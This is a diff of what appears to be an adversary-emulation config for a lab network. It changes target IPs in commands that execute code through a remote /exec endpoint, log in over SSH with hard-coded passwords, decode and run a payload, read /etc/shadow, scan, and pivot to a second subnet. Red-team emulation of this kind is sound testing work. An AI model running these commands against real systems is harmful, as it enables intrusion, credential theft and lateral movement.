@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec"
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'base64 -d /tmp/encoded_payload.b64 > /tmp/payload.py && python3 /tmp/payload.py'"
+        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'base64 -d /tmp/encoded_payload.b64 > /tmp/payload.py && python3 /tmp/payload.py'"
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sudo cat /etc/passwd' && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sudo cat /etc/shadow'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sudo cat /etc/passwd' && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sudo cat /etc/shadow'"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 echo '$(whoami) on $(uname -n)'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 echo '$(whoami) on $(uname -n)'"
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'nmap localhost 2>&1'"
+        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'nmap localhost 2>&1'"
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd'  ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 \"echo 'mining crypto coins'\""
+        "command": "sshpass -p 'Passw0rd'  ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 \"echo 'mining crypto coins'\""
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec"
       }
     ]
   },
@@ -115,7 +115,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command":  "sshpass -p 'Passw0rd' ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@172.21.0.20 'ip -brief a; ip r; ip neigh; hostname -I; sshpass -p \"Passw0rd\" ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@172.22.0.20 \"ip -brief a; ip r; ip neigh; hostname -I\"'"
+        "command":  "sshpass -p 'Passw0rd' ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@192.168.20.30 'ip -brief a; ip r; ip neigh; hostname -I; sshpass -p \"Passw0rd\" ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@192.168.30.40 \"ip -brief a; ip r; ip neigh; hostname -I\"'"
       }
     ]
   },
@@ -130,7 +130,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 wget http://172.21.0.20/dist/nmap-7.98.tgz"
+        "command": "sshpass -p 'Passw0rd' ssh attacker@192.168.20.30 wget http://192.168.20.30/dist/nmap-7.98.tgz"
       }
     ]
   },
